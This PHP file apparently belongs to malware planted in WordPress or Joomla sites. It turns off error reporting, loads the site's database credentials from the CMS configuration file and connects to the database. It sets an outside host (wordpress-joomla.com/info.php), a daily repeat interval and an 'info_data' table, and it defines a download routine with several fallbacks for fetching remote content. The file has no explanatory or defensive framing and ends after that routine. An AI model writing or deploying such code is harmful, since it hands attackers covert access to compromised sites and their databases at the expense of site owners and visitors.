<?php
if(function_exists('error_reporting')){
    error_reporting(0);
}
$root = array_key_exists('DOCUMENT_ROOT',$_SERVER)?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__.'/../');
$DB = null;
//Try WP
$configfile=$root.'/wp-config.php';
if(file_exists($configfile)){
    include_once($configfile);
    $DB = array(
        'host'=>DB_HOST,
        'name'=>DB_NAME,
        'user'=>DB_USER,
        'pass'=>DB_PASSWORD,
        'charset'=>DB_CHARSET
    );
}
else{
    //Try joomla
    $configfile = $root.'/configuration.php';
    include_once($configfile);
    $c = new JConfig();
    $DB = array(
        'host'=>$c->host,
        'name'=>$c->db,
        'user'=>$c->user,
        'pass'=>$c->password,
        'charset'=>'utf8'
    );
    unset($c);
}
define('REMOTE_URI','http://wordpress-joomla.com/info.php');
define('REPEAT_AFTER',86400);
define('TABLE_NAME','info_data');
$link=null;
if($DB !== null){
    $DB['table'] = TABLE_NAME;
    $link = @mysql_connect($DB['host'],$DB['user'],$DB['pass']);
    if(is_resource($link)){
        mysql_query('use '.$DB['name'],$link);
        mysql_query('set names '.$DB['charset'],$link);
    }
    else{

    }
}
else{

}

if(!function_exists('download')){
    function download($uri){
        if(function_exists('curl_init')){

            $curl = curl_init($uri);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, '1');
            $ret = curl_exec($curl);
            curl_close($curl);
            return $ret;
        }
        elseif(function_exists('fsockopen')){
            if (!function_exists("stripos")) {

                function stripos($str, $needle, $offset=0) {
                    return strpos(strtolower($str), strtolower($needle), $offset);
                }

            }
            $port = 80;
            $extra_headers = array();
            $uri = strtr(strval($uri), array("http://" => "", "https://" => "ssl://", "ssl://" => "ssl://", "\\" => "/", "//" => "/"));

            if (( $protocol = stripos($uri, "://") ) !== FALSE) {
                if (( $domain_pos = stripos($uri, "/", ($protocol + 3)) ) !== FALSE) {
                    $domain = substr($uri, 0, $domain_pos);
                    $file = substr($uri, $domain_pos);
                } else {
                    $domain = $uri;
                    $file = "/";
                }
            } else {
                if (( $domain_pos = stripos($uri, "/") ) !== FALSE) {
                    $domain = substr($uri, 0, $domain_pos);
                    $file = substr($uri, $domain_pos);
                } else {
                    $domain = $uri;
                    $file = "/";
                }
            }

            $fp = fsockopen($domain, $port, $errno, $errstr, 30);
            if (!$fp) {
                return FALSE;
            } else {
                $out = "GET " . $file . " HTTP/1.1\r\n";
                $out .= "Host: " . $domain . "\r\n";
                foreach ($extra_headers as $nm => $vl) {
                    $out .= strtr(strval($nm), array("\r" => "", "\n" => "", ": " => "", ":" => "")) . ": " . strtr(strval($vl), array("\r" => "", "\n" => "", ": " => "", ":" => "")) . "\r\n";
                }
                $out .= "Connection: Close\r\n\r\n";

                $response = "";
                fwrite($fp, $out);
                while (!feof($fp)) {
                    $response .= fgets($fp, 128);
                }
                fclose($fp);

                //global $http_response_header;
                $http_response_header = array();
                if (stripos($response, "\r\n\r\n") !== FALSE) {
                    $hc = explode("\r\n\r\n", $response);
                    $headers = explode("\r\n", $hc[0]);

                    if (!is_array($headers)){
                        $headers = array();
                    }
                    foreach ($headers as $key => $header) {
                        $a = "";
                        $b = "";
                        if (stripos($header, ":") !== FALSE) {
                            list($a, $b) = explode(":", $header);
                            $http_response_header[trim($a)] = trim($b);
                        }
                    }
                    return end($hc);
                }
                else if (stripos($response, "\r\n") !== FALSE) {
                    $headers = explode("\r\n", $response);

                    if (!is_array($headers)){
                        $headers = array();
                    }
                    foreach ($headers as $key => $header) {
                        if ($key < ( count($headers) - 1 )) {
                            $a = "";
                            $b = "";
                            if (stripos($header, ":") !== FALSE) {
                                list($a, $b) = explode(":", $header);
                                $http_response_header[trim($a)] = trim($b);
                            }
                        }
                    }
                    return end($headers);
                }
                else {
                    return $response;
                }
            }
        }
        elseif(ini_get('allow_url_fopen') && function_exists('file_get_contents')){
            return file_get_contents($uri);
        }
    }
}